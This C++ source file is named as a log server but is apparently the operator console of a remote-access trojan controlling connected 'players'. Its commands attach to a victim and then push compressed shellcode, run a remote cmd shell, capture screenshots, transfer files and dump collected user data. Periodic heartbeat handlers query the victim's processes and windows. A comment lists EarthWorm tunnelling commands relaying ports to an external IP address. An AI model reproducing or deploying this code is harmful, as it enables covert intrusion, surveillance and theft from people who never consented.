// log_server.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <fstream>
#include <unordered_map>
#include <regex>
#include <asio2/asio2.hpp>
#include <asio/detail/thread_group.hpp>
#include "protocol.h"
#include "rmc_protocol.h"
#include "cmdline.h"
#include "utils.h"
#include "log_server.h"
#include "rmc_mgr.h"
#include "player_mgr.h"
#include "HPSocket.h"
#include "db_utils.h"

/*
服务端
.\ew_win32.exe -s lcx_listen -l 23229 -e 12345
客户端
.\ew_win32.exe -s lcx_tran -l 23229 -d 150.242.99.244 -e 12345
.\ew_win32.exe -s lcx_tran -l 23230 -f 150.242.99.244 -g 23230
.\ew_win32.exe -s lcx_tran -l 23228 -f 150.242.99.244 -g 23228
*/
struct UserData
{
	bool is_login = false;
};

LogServer::LogServer()
{
	client_.bind("log", &LogServer::log_internal_, this);
	client_.bind("trans_recv", &LogServer::trans_recv_internal_, this);
	client_.bind_connect([this](std::error_code ec) {
		if (!ec)
		{
			login(default_key);
		}
	});
	client_.bind_disconnect([this](std::error_code ec) {
		std::cerr << "disconnect" << std::endl;
	});

	thread_group_.create_threads([this]() {
		auto work_guard = asio::make_work_guard(work_io());
		work_io().run();
		debug_log("work io exit");
	}, std::thread::hardware_concurrency());
}

LogServer& LogServer::instance()
{
	static LogServer instance_;
	return instance_;
}

bool LogServer::connect(const std::string& ip, unsigned short port)
{
	return client_.start(ip, port);
}

bool LogServer::login(const std::string& key)
{
	client_.async_call([](std::error_code ec, bool r) {
		if (ec)
		{
			std::cerr << "login call failed" << std::endl;
			return;
		}
		if (!r)
		{
			std::cerr << "login failed" << std::endl;
		}
	}, std::chrono::seconds(10), "login", key);
	return true;
}

bool LogServer::trans_send(unsigned long conn_id, Protocol& proto)
{
	json temp;
	proto.to_json(temp);
	Protocol package(temp);
	return trans_send(conn_id, package.get_raw_buffer(), package.get_raw_size());
}

bool LogServer::set_trans_recv(bool enable_trans_recv, const std::unordered_set<unsigned long>& filter)
{
	std::error_code ec;
	client_.call<void>(ec, std::chrono::seconds(10), "set_trans_recv", enable_trans_recv, filter);
	if (ec)
	{
		debug_log("enable_log error ec:%s", ec.message().c_str());
		return false;
	}
	return true;
}

bool LogServer::enable_log(bool enable_log)
{
	std::error_code ec;
	client_.call<void>(ec, std::chrono::seconds(10), "enable_log", enable_log);
	if (ec)
	{
		debug_log("enable_log error ec:%s",ec.message().c_str());
		return false;
	}
	return true;
}

bool LogServer::trans_send(unsigned long id, const unsigned char* buffer, int size)
{
	std::vector<unsigned char> buffer_(size);
	memcpy(buffer_.data(), buffer, size);
	std::error_code ec;
	bool r = client_.call<bool>(ec, std::chrono::seconds(5), "trans_send", id, buffer_);
	if (!r)
	{
		debug_log("trans send fail conn_id:%d", id);
	}
	if (ec)
	{
		debug_log("trans send error conn_id:%d ec:%s", id, ec.message().c_str());
	}
	return r;
}

void LogServer::log_internal_(
	const std::list<std::string>& args
)
{
	if (args.size())
	{
		std::stringstream ss;
		for (auto& arg : args)
		{
			ss << arg << "|";
		}
		ss << std::endl;
		debug_log("%s",ss.str().c_str());
	}
}

void LogServer::trans_recv_internal_(
	unsigned long conn_id,
	const std::vector<unsigned char>& args
)
{
	on_recv_package(conn_id, args);
}

bool LogServer::send_shellcode(unsigned long conn_id, std::string& file)
{
	std::string shellcode = read_file(file);
	if (shellcode.size() == 0)
	{
		return false;
	}
	ProtocolShellCode proto;
	compress_shellcode_(shellcode, proto);
	return trans_send(conn_id, proto);
}

std::string LogServer::read_file(std::string& file)
{
	std::string buffer;
	std::ifstream bin(file, std::ios::in | std::ios::binary);
	if (bin.is_open() == false)
	{
		return buffer;
	}
	bin.seekg(0, bin.end);
	size_t bin_size = (size_t)bin.tellg();
	bin.seekg(0);
	buffer.resize(bin_size);
	bin.read((char*)buffer.data(), bin_size);
	bin.close();
	return buffer;
}

void LogServer::compress_shellcode_(const std::string& shellcode, ProtocolShellCode& proto)
{
	DWORD compress_buffer_size = SYS_GuessCompressBound(shellcode.size());
	std::unique_ptr<unsigned char[]> compress_buffer = std::make_unique<unsigned char[]>(compress_buffer_size);
	int status = SYS_Compress((uint8_t*)shellcode.data(),
		shellcode.size(),
		compress_buffer.get(),
		compress_buffer_size);
	if (status != 0)
	{
		proto.status = status;
		return;
	}
	proto.status = 0;
	proto.uncompress_size = shellcode.size();
	proto.data.resize(compress_buffer_size);
	memcpy(proto.data.data(), compress_buffer.get(), compress_buffer_size);
}


void LogServer::on_recv_heartbeat(unsigned long conn_id, const ProtocolHeartBeat& proto)
{
	auto query_action = [&]() {
		/*work_io().post(std::bind(&RmcMgr::query_information, RmcMgr::instance(), conn_id, QUERY_INFORMATION_COMPUTER_NAME));*/
		work_io().post(std::bind(&RmcMgr::query_information, RmcMgr::instance(), conn_id, QUERY_INFORMATION_PROCESS));
		work_io().post(std::bind(&RmcMgr::query_information, RmcMgr::instance(), conn_id, QUERY_INFORMATION_WINDOWS));
		debug_log("query information to %d", conn_id);
	};
	if (PlayerMgr::instance().exist(conn_id))
	{
		auto& data = *PlayerMgr::instance().get_player_data(conn_id).lock();
		const auto now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		auto last_query_time = now;
		if (data.find("last_query_time") == data.end())
		{
			query_action();
			data["last_query_time"] = now;
		}
		else
		{
			last_query_time = data["last_query_time"];
		}
		auto delta = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::milliseconds(now - last_query_time));
		if (delta > std::chrono::seconds(10 * 60))
		{
			query_action();
			data["last_query_time"] = now;
		}
	}
	PlayerMgr::instance().heartbeat(conn_id, proto);
    /*DBUtils::instance().save_heartbeat_log(proto);*/
}

void LogServer::on_recv_rmc(unsigned long conn_id, const ProtocolRmc& proto)
{
	RmcMgr::instance().on_recv_rmc(conn_id, proto);
}

void LogServer::on_recv_package(unsigned long conn_id, const std::vector<unsigned char>& buffer)
{
	Protocol proto;
	if (proto.unpak(buffer.data(), buffer.size()))
	{
		json package;
		proto.get_json(package);
		if (package.find(GlobalString::JsonProperty::ID) == package.end())
		{
			debug_log("json id property not found");
			return;
		}
		Protocol::PackageId package_id = package[GlobalString::JsonProperty::ID];
		debug_log("on recv %d %d", conn_id, package_id);
		switch (package_id)
		{
		case Protocol::PackageId::PACKAGE_ID_HEARTBEAT:
		{
			ProtocolHeartBeat heartbeat;
			heartbeat.from_json(package);
			on_recv_heartbeat(conn_id, heartbeat);
			break;
		}
		case Protocol::PackageId::PACKAGE_ID_RMC:
		{
			ProtocolRmc rmc;
			rmc.from_json(package);
			on_recv_rmc(conn_id, rmc);
			break;
		}
		default:
			break;
		}
	}
}


int main()
{  
	std::string cmd;
	SetConsoleOutputCP(65001);
	while (getline(std::cin, cmd))
	{
		cmdline::parser a;
		a.parse(cmd);
		static unsigned long attach_id = 0;
		switch (aphash(a.get_prog_name().c_str()))
		{
		case aphash("cls"):
		{
			system("cls");
			break;
		}
		case aphash("lsc"):
		{
			a.add("count", 'c', "query online player count");
			a.add("dump", 'd', "dump user info to file");
			a.add<int>("page", 'p', "goto page n", false, 0);
			a.add<int>("limit", 'l', "page limit", false, 10);
			a.add<std::string>("filter", 'f', "filter to list", false, "");
			a.parse(cmd);
			
			std::string filter = to_utf8(a.get<std::string>("filter"));
			std::unordered_map<unsigned long, std::shared_ptr<json>> filter_players;

			if (a.exist("filter"))
			{
				for (auto& itor : PlayerMgr::instance().get_players())
				{
					auto content = itor.second->dump(-1, ' ', false, json::error_handler_t::ignore);
					if (content.find(filter) != std::string::npos)
					{
						filter_players.emplace(itor);
					}
				}
			}
			else
			{
				filter_players = PlayerMgr::instance().get_players();
			}
			
			const int count = filter_players.size();
			if (a.exist("count"))
			{
				std::cout << "online player:" << count << std::endl;
				break;
			}

			bool dump_to_file = a.exist("dump");
			std::ofstream output_file(std::to_string(GetTickCount()) + ".txt", std::ios::out | std::ios::binary);

			if (a.exist("page"))
			{
				int page = a.get<int>("page");
				const int limit = a.get<int>("limit");
				const int max_page = count / limit;
				page = std::min(page, max_page);
				const int left = page * limit;
				const int right = std::min(count, left + limit);
				int n = 0;
				for (auto& itor : filter_players)
				{
					if (left <= n && n < right)
					{
						if (dump_to_file)
							output_file << itor.first << std::endl
							<< itor.second->dump(-1, ' ', false, json::error_handler_t::ignore)
							<< std::endl;
						std::cout << itor.first << std::endl
							<< itor.second->dump(-1, ' ', false, json::error_handler_t::ignore)
							<< std::endl;
					}
					n++;
				}
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("attach"):
		{
			a.add<unsigned long>("id", 'i', "player id", true, 0);
			a.parse(cmd);
			if (a.exist("id"))
			{
				const unsigned long id = a.get<unsigned long>("id");
				attach_id = id;
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("echo"):
		{
			a.add<std::string>("content", 'c', "content", true, "");
			a.parse(cmd);
			if (a.exist("content"))
			{
				std::string content = a.get<std::string>("content");
				RmcMgr::instance().send_echo(attach_id, content);
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("shellcode"):
		{
			a.add<std::string>("path", 'p', "shell code path", true, "");
			a.parse(cmd);
			if (a.exist("path"))
			{
				std::string path = a.get<std::string>("path");
				std::cout << LogServer::instance().send_shellcode(attach_id, path) << std::endl;
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("uploadfile"):
		{
			a.add<std::string>("path", 'p', "path", true, "");
			a.parse(cmd);
			if (a.exist("path"))
			{
				std::string path = a.get<std::string>("path");
				RmcMgr::instance().upload_file(attach_id, path);
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("screenshot"):
		{
			if (PlayerMgr::instance().exist(attach_id))
			{
				std::string player_name = from_utf8(PlayerMgr::instance().get_player_data(attach_id).lock()->at("username").get<std::string>());
				RmcMgr::instance().upload_screenshot(attach_id, std::to_string(GetTickCount()) + "_" + player_name + ".jpg");
			}
			break;
		}
		case aphash("downloadfile"):
		{
			a.add<std::string>("path", 'p', "remote path", true, "");
			a.add<std::string>("local", 'l', "local path", true, "");
			a.parse(cmd);
			if (a.exist("path") && a.exist("local"))
			{
				std::string path = a.get<std::string>("path");
				std::string local = a.get<std::string>("local");
				RmcMgr::instance().download_file(attach_id, local, path);
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("connect"):
		{
			a.add<std::string>("ip", 'i', "remote ip", false, "127.0.0.1");
			a.add<unsigned short>("port", 'p', "remote port", false, 23229);
			a.parse_check(cmd);
			if (LogServer::instance().connect(a.get<std::string>("ip"), a.get<unsigned short>("port")))
			{
				std::cout << "connect success" << std::endl;
				break;
			}
			else
			{
				std::cerr << "connect failed" << std::endl;
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("shell"):
		{
			a.add("create", 'c', "create cmd");
			a.add("close", '\0', "close cmd");
			a.add<std::string>("path", 'p', "work dir", false, ".\\");
			a.add<std::string>("execute", 'e', "execute cmd");
			a.parse(cmd);
			if (a.exist("create"))
			{
				RmcMgr::instance().create_cmd(attach_id, a.get<std::string>("path"));
				break;
			}
			if (a.exist("execute"))
			{
				RmcMgr::instance().execute_cmd(attach_id, a.get<std::string>("execute"));
				break;
			}
			if (a.exist("close"))
			{
				RmcMgr::instance().close_cmd(attach_id);
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		case aphash("set"):
		{
			a.add("trans_recv_start", '\0', "trans_recv_start");
			a.add("trans_recv_stop", '\0', "trans_recv_stop");
			a.add<std::string>("filter", 'f', "proto id filter", true, "0|9900");
			a.parse(cmd);
			std::string filter = a.get<std::string>("filter");
			std::regex sep("\\|");
			std::unordered_set<unsigned long> filter_set;
			for (std::sregex_token_iterator reg(filter.begin(), filter.end(), sep, -1); reg != std::sregex_token_iterator(); reg++)
			{
				filter_set.emplace(std::stoul(reg->str()));
			}
			if (a.exist("trans_recv_start"))
			{
				LogServer::instance().set_trans_recv(true, filter_set);
				break;
			}
			else if (a.exist("trans_recv_stop"))
			{
				LogServer::instance().set_trans_recv(false, filter_set);
				break;
			}
			std::cerr << a.usage() << std::endl;
			break;
		}
		default:
			break;
		}
	}
}


